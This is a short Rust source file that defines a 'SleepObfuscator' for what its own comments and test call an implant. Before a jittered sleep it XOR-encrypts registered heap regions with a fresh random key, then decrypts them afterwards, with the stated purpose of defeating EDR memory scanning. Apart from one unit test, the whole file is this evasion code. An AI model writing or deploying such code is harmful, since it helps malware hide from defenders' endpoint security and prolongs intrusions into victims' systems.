use rand::Rng;
use tokio::time::{sleep, Duration};

/// SleepObfuscator encrypts sensitive heap memory during idle periods
/// to defeat memory scanning by EDR.
pub struct SleepObfuscator {
    regions: Vec<(*mut u8, usize)>,
    xor_key: [u8; 32],
}

impl SleepObfuscator {
    pub fn new() -> Self {
        Self {
            regions: Vec::new(),
            xor_key: [0u8; 32],
        }
    }

    /// Register a heap region to be encrypted during sleep
    pub fn protect_region(&mut self, ptr: *mut u8, size: usize) {
        self.regions.push((ptr, size));
    }

    /// Encrypt registered regions, sleep, then decrypt
    pub async fn obfuscated_sleep(&mut self, secs: u64, jitter_pct: u8) {
        rand::thread_rng().fill(&mut self.xor_key);

        for &(ptr, size) in &self.regions {
            if ptr.is_null() { continue; }
            unsafe {
                for i in 0..size {
                    *ptr.add(i) ^= self.xor_key[i % 32];
                }
            }
        }

        let jitter = rand::thread_rng().gen_range(0.0..(jitter_pct as f64 / 100.0));
        let delay = (secs as f64 * (1.0 + jitter)) as u64;
        sleep(Duration::from_secs(delay)).await;

        for &(ptr, size) in &self.regions {
            if ptr.is_null() { continue; }
            unsafe {
                for i in 0..size {
                    *ptr.add(i) ^= self.xor_key[i % 32];
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_obfuscated_sleep_preserves_data() {
        let mut data = b"this is sensitive implant data".to_vec();
        let mut obf = SleepObfuscator::new();
        obf.protect_region(data.as_mut_ptr(), data.len());
        obf.obfuscated_sleep(0, 0).await;
        assert_eq!(&data, b"this is sensitive implant data");
    }
}
